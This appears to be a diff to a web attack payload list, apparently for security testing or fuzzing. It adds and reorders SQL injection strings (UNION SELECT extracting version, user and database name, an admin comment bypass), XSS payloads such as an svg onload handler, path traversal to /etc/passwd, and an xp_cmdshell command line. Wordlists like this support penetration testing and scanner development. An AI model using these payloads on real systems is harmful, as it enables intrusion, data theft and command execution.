@@ -1,8 +1,11 @@
 ' OR 1=1--
 " OR 1=1--
-' UNION SELECT null,@@version--
 <script>alert('xss')</script>
-"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>
 ../etc/passwd
 ../../etc/passwd
 ../../../etc/passwd
+admin'--
+' UNION SELECT null,@@version--
+' UNION SELECT null,concat(user(),0x3a,database())--
+exec xp_cmdshell('ipconfig')
